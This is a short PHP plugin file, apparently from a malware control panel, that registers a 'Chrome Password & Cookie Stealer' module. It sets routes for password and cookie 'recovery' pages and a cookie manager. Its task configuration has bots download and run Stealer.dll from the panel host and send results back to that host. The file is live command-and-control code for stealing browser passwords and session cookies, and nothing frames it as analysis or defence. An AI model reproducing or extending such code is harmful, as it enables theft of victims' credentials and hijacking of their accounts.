<?php

require ("Controller/PassMain.class.php");
require ("Controller/Recovery.class.php");
$GLOBALS["foundPlugins"]["stealer"]["plugindir"] = __DIR__;


$router->all('/passwordrecovery', 'Recovery@passwordrecovery');
$router->all('/cookierecovery', 'Recovery@cookierecovery');

$router->all('/stealer', 'PassMain@passrecovery');
$router->all('/cookiemanager/(\d+)', 'PassMain@cookiemanager');

register_navigation_tab("stealer",get_plugin_include_dir("stealer")."assets/nav/stealer.svg");




$host = "http://".$_SERVER["HTTP_HOST"];

$GLOBALS["task_configuration"]["stealer"] = array(
    "name" => "Chrome Password & Cookie Stealer",
    "command" => "runplugin",
    "value" => $host."/versions/".$GLOBALS["loadedVersion"]."/plugins/stealer/dll/Stealer.dll;runstealer;".$host
);
